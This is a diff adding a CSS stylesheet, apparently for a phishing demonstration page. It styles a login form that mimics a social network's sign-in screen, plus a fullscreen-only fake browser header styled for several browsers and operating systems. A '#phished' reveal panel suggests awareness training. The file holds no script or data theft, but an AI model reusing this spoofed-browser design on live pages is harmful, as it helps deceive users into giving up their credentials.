@@ -1,0 +1,324 @@
+body {
+  margin: 0;
+  font-family: 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+  background-color: #000;
+  color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  display: flex;
+  max-width: 1000px;
+  width: 100%;
+  justify-content: center;
+  align-items: center;
+}
+
+.group5 {
+  flex-direction: column;
+  text-align: center;
+}
+
+.fake-link {
+  display: inline-block;
+  padding: 12px 24px;
+  background: #3897f0;
+  color: white;
+  font-weight: bold;
+  border-radius: 5px;
+  text-decoration: none;
+  transition: 0.2s;
+}
+
+.fake-link:hover {
+  background: #2c82d3;
+}
+
+.note {
+  margin-top: 15px;
+  font-size: 14px;
+  color: #888;
+}
+
+.left {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.right {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  background: #000;
+  padding: 20px;
+}
+
+.logo {
+  font-family: 'Brush Script MT', cursive;
+  font-size: 48px;
+  margin-bottom: 20px;
+}
+
+.form {
+  width: 100%;
+  max-width: 300px;
+  display: flex;
+  align-items: center;
+}
+
+.form input {
+  flex: 1;
+  background: #000;
+  border: 1px solid #444;
+  padding: 12px;
+  margin: 5px 0;
+  border-radius: 4px;
+  font-size: 13px;
+  color: #fff;
+  width: 90%;
+}
+
+.form button {
+  background: #0082FB;
+  opacity: 0.7;
+  border: none;
+  padding: 10px;
+  margin: 8px 0;
+  border-radius: 8px;
+  color: #fff;
+  font-weight: bold;
+  cursor: pointer;
+  width: 100%;
+}
+
+.or {
+  display: flex;
+  align-items: center;
+  color: #aaa;
+  font-size: 10px;
+  margin: 1px 10px 0;
+}
+
+.or::before,
+.or::after {
+  content: "";
+  flex: 1;
+  border-top: 1px solid #444;
+  margin: 0 8px;
+}
+
+.facebook {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  color: #007BFC;
+  font-weight: bold 500;
+  margin: 15px 10px 10px;
+  cursor: pointer;
+  font-size: 14px;
+}
+
+.link {
+  color: #ffffff;
+  cursor: pointer;
+}
+
+.a.forgot-password {
+  color: #ffffff;
+  cursor: pointer;
+  font-size: 14px;
+  margin: 10px;
+  text-align: center;
+  padding-bottom: 20px;
+}
+
+.footer {
+  position: absolute;
+  bottom: 20px;
+  width: 100%;
+  text-align: center;
+  color: #aaa;
+  font-size: 12px;
+}
+
+.footer a {
+  color: #aaa;
+  text-decoration: none;
+  margin: 0 6px;
+}
+
+#spoofHeader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  width: 100%;
+  /* chiếm 100% màn hình */
+  z-index: 9999;
+  background: #000;
+  display: none;
+  /* Mặc định ẩn */
+}
+
+#spoofBrowser {
+  height: 80px;
+  /* chiều cao header */
+  overflow: hidden;
+  /* tránh tràn ảnh */
+}
+
+#spoofBrowser img {
+  width: 100%;
+  /* full chiều ngang */
+  height: 100%;
+  /* co theo chiều cao container */
+  object-fit: cover;
+  /* phủ kín, không méo */
+  display: block;
+}
+
+/* Chỉ hiển thị khi đã fullscreen */
+html.fullscreened #spoofHeader {
+  display: block !important;
+}
+
+html.not-fullscreened #spoofHeader {
+  display: none !important;
+}
+
+#phished {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: white;
+  padding: 10px;
+  border-radius: 15px;
+  box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
+  text-align: center;
+  z-index: 1000;
+  width: 90%;
+  max-width: 800px;
+}
+
+#phished p {
+  margin: 0;
+  padding: 0;
+}
+
+#phished img {
+  width: 100%;
+  max-width: 800px;
+  height: auto;
+  margin: 0 0;
+  border-radius: 10px;
+}
+
+#phished h2 {
+  margin: 10px 0;
+  font-size: 1.8em;
+  color: #333;
+}
+
+#phished ul {
+  list-style: none;
+  padding: 0;
+  margin: 10px 0;
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 10px;
+  width: 100%;
+}
+
+#phished li {
+  font-size: 1.1em;
+  color: #444;
+  padding: 5px;
+  text-align: center;
+}
+
+#phished br {
+  display: none;
+}
+
+/* Browser-specific fake UI */
+.fullscreened #spoofHeader {
+  display: block !important;
+}
+
+.not-fullscreened #spoofHeader {
+  display: none !important;
+}
+
+/* Fake browser chrome styling */
+html.chrome.osx #spoofBrowser {
+  background: linear-gradient(to bottom, #e8e8e8, #d0d0d0);
+  border-bottom: 1px solid #b0b0b0;
+}
+
+html.firefox.osx #spoofBrowser {
+  background: linear-gradient(to bottom, #f0f0f0, #e0e0e0);
+  border-bottom: 1px solid #c0c0c0;
+}
+
+html.safari.osx #spoofBrowser {
+  background: linear-gradient(to bottom, #f5f5f5, #e5e5e5);
+  border-bottom: 1px solid #d0d0d0;
+}
+
+/* Windows browser styles */
+html.chrome.windows #spoofBrowser {
+  background: linear-gradient(to bottom, #ffffff, #f0f0f0);
+  border-bottom: 1px solid #c0c0c0;
+}
+
+html.firefox.windows #spoofBrowser {
+  background: linear-gradient(to bottom, #f8f8f8, #e8e8e8);
+  border-bottom: 1px solid #b8b8b8;
+}
+
+/* Linux browser styles */
+html.chrome.linux #spoofBrowser {
+  background: linear-gradient(to bottom, #f4f4f4, #e4e4e4);
+  border-bottom: 1px solid #c4c4c4;
+}
+
+html.firefox.linux #spoofBrowser {
+  background: linear-gradient(to bottom, #f6f6f6, #e6e6e6);
+  border-bottom: 1px solid #c6c6c6;
+}
+
+/* Animation for shake effect */
+@keyframes shake {
+
+  0%,
+  100% {
+    transform: translateX(0);
+  }
+
+  10%,
+  30%,
+  50%,
+  70%,
+  90% {
+    transform: translateX(-10px);
+  }
+
+  20%,
+  40%,
+  60%,
+  80% {
+    transform: translateX(10px);
+  }
+}
+
+.ui-effects-shake {
+  animation: shake 0.5s ease-in-out;
+}
